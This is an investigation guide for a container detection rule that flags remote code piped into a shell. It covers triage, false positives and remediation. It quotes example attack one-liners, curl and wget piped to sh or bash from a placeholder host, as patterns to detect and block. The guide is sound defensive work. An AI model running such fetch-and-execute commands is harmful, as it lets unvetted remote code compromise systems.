---
applies_to:
  stack: ga all
  serverless:
    security: ga all
products:
  - id: security
  - id: cloud-serverless
description: 'Investigation guide for the "Payload Execution via Shell Pipe Detected by Defend for Containers" prebuilt detection rule.'
---

# Payload Execution via Shell Pipe Detected by Defend for Containers

## Triage and analysis

> **Disclaimer**:
> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.

### Investigating Payload Execution via Shell Pipe Detected by Defend for Containers

This rule detects an interactive session in a running Linux container where a downloader process is immediately followed by a shell execution, consistent with fetching code and executing it without writing a file. This matters because piping remote content directly into a shell enables fast, stealthy execution and can bypass filesystem-based controls and forensics. Attackers commonly run patterns like `curl http://host/payload.sh | sh` or `wget -qO- http://host/bootstrap | bash` during initial foothold or lateral movement inside containers.

### Possible investigation steps

- Capture the full interactive command line and session context (TTY/user, working directory, parent chain) to determine whether the shell received stdin from the downloader and what was executed.  
- Identify the remote URL/host contacted and pivot on outbound network telemetry (DNS/HTTP/SNI/IP) to confirm download success, reputation, and whether the endpoint has been used by other workloads.  
- Enumerate follow-on processes spawned by the shell within the next few minutes (e.g., package installs, compilers, crypto-miners, persistence tooling) to assess impact and scope of execution.  
- Check for container breakout or host interaction indicators by reviewing new mounts, access to the Docker/CRI socket, privileged namespace usage, and any writes to host paths from within the container.  
- Preserve volatile artifacts by exporting the container filesystem and collecting in-memory/runtime evidence (environment variables, loaded binaries, cron/systemd/user profiles) before the workload is recycled.

### False positive analysis

- An administrator or developer may use an interactive exec session to troubleshoot or apply a quick remediation by running `curl`/`wget` piped into `sh` (to avoid saving a temporary file), so validate the interactive user/TTY, parent process chain, and whether the contacted URL/host is an expected internal source.  
- During manual container bootstrap or environment setup, an operator may fetch a short initialization or configuration script via `curl`/`wget` and immediately invoke a shell to run it, so confirm it aligns with recent deployment/change activity and that follow-on process, network, and filesystem behavior matches the intended setup.

### Response and remediation

- Immediately isolate the affected container/pod by blocking egress and terminating any active `kubectl exec`/interactive sessions that launched `curl`/`wget` and then a shell to stop further command execution.  
- Preserve evidence before restart by snapshotting the container image/filesystem and collecting running process trees, open network connections, environment variables, and shell history/output associated with the piped execution.  
- Eradicate by deleting and redeploying the workload from a known-good image, rotating any secrets and tokens available to the container, and removing any unauthorized binaries, cron jobs, startup scripts, or modified entrypoints created by the shell session.  
- Escalate to incident response immediately if the downloaded content contacted unknown/external infrastructure, spawned post-exploitation tooling (e.g., miners, scanners, reverse shells), or showed signs of host interaction such as access to the container runtime socket or host-mounted paths.  
- Harden by restricting interactive exec access (RBAC/MFA/just-in-time), enforcing signed/approved images, applying network policies to limit outbound access, and adding runtime controls to block `curl|sh`/`wget|sh` patterns or require allowlisted internal artifact sources.
